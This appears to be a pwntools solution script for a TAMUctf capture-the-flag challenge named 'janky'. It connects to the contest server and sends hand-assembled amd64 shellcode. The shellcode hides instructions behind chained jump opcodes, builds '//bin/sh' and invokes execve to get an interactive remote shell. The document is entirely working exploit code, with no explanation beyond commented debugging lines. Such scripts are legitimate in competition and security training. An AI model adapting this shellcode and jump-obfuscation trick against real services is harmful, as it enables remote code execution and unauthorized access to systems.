from pwn import *

elf = context.binary = ELF("./janky",checksec=False)
# p = elf.process()
p = remote("tamuctf.com", 443, ssl=True, sni="janky")

context.arch = "amd64"

# gdb.attach(p,'''
#     init-gef
#     b *main+102
#     c
# ''')

# paylaod = b'\xeb\x01'

jmp = asm('''
    jmp $+0x3               
''')

# print(shellcraft.sh())

# mov rax, 0x732f2f2f6e69622f


shellcode  = jmp + b"\xE9\x31\xF6\x31\xd2"
shellcode += jmp + b"\xE9\x66\xB8\x3B\x00"
shellcode += jmp + b"\xE9\x66\xBF\x73\x68"
shellcode += jmp + b"\xE9\x48\xC1\xE7\x10"
shellcode += jmp + b"\xE9\x66\xBF\x6E\x2F"
shellcode += jmp + b"\xE9\x48\xC1\xE7\x10"
shellcode += jmp + b"\xE9\x66\xBF\x62\x69"
shellcode += jmp + b"\xE9\x48\xC1\xE7\x10"
shellcode += jmp + b"\xE9\x66\xBF\x2f\x2f"
shellcode += jmp + b"\xE9\x48\xC1\xEF\x08"
shellcode += jmp + b"\xE9\x57\x48\x89\xE7"
shellcode += jmp + b"\xE9\x0F\x05\x90\x90"

p.send(shellcode)

p.interactive()